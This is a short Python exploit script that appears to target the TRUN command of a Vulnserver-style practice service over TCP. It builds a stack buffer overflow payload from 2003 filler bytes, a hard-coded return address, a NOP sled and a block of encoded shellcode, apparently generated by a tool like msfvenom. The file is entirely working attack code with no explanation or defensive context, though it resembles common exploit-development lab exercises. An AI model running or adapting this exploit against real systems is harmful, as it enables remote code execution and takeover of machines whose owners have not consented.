#!/usr/bin/python3

import sys, socket
from time import sleep

overflow = (b"\xbb\x93\xef\xea\xb0\xdd\xc3\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
b"\x52\x31\x58\x12\x83\xe8\xfc\x03\xcb\xe1\x08\x45\x17\x15\x4e"
b"\xa6\xe7\xe6\x2f\x2e\x02\xd7\x6f\x54\x47\x48\x40\x1e\x05\x65"
b"\x2b\x72\xbd\xfe\x59\x5b\xb2\xb7\xd4\xbd\xfd\x48\x44\xfd\x9c"
b"\xca\x97\xd2\x7e\xf2\x57\x27\x7f\x33\x85\xca\x2d\xec\xc1\x79"
b"\xc1\x99\x9c\x41\x6a\xd1\x31\xc2\x8f\xa2\x30\xe3\x1e\xb8\x6a"
b"\x23\xa1\x6d\x07\x6a\xb9\x72\x22\x24\x32\x40\xd8\xb7\x92\x98"
b"\x21\x1b\xdb\x14\xd0\x65\x1c\x92\x0b\x10\x54\xe0\xb6\x23\xa3"
b"\x9a\x6c\xa1\x37\x3c\xe6\x11\x93\xbc\x2b\xc7\x50\xb2\x80\x83"
b"\x3e\xd7\x17\x47\x35\xe3\x9c\x66\x99\x65\xe6\x4c\x3d\x2d\xbc"
b"\xed\x64\x8b\x13\x11\x76\x74\xcb\xb7\xfd\x99\x18\xca\x5c\xf6"
b"\xed\xe7\x5e\x06\x7a\x7f\x2d\x34\x25\x2b\xb9\x74\xae\xf5\x3e"
b"\x7a\x85\x42\xd0\x85\x26\xb3\xf9\x41\x72\xe3\x91\x60\xfb\x68"
b"\x61\x8c\x2e\x3e\x31\x22\x81\xff\xe1\x82\x71\x68\xeb\x0c\xad"
b"\x88\x14\xc7\xc6\x23\xef\x80\x28\x1b\xee\x34\xc1\x5e\xf0\xa5"
b"\x4d\xd6\x16\xaf\x7d\xbe\x81\x58\xe7\x9b\x59\xf8\xe8\x31\x24"
b"\x3a\x62\xb6\xd9\xf5\x83\xb3\xc9\x62\x64\x8e\xb3\x25\x7b\x24"
b"\xdb\xaa\xee\xa3\x1b\xa4\x12\x7c\x4c\xe1\xe5\x75\x18\x1f\x5f"
b"\x2c\x3e\xe2\x39\x17\xfa\x39\xfa\x96\x03\xcf\x46\xbd\x13\x09"
b"\x46\xf9\x47\xc5\x11\x57\x31\xa3\xcb\x19\xeb\x7d\xa7\xf3\x7b"
b"\xfb\x8b\xc3\xfd\x04\xc6\xb5\xe1\xb5\xbf\x83\x1e\x79\x28\x04"
b"\x67\x67\xc8\xeb\xb2\x23\xe8\x09\x16\x5e\x81\x97\xf3\xe3\xcc"
b"\x27\x2e\x27\xe9\xab\xda\xd8\x0e\xb3\xaf\xdd\x4b\x73\x5c\xac"
b"\xc4\x16\x62\x03\xe4\x32")

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.1.101',9999))

	payload = b"TRUN /.:/" + shellcode

	s.send((payload))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()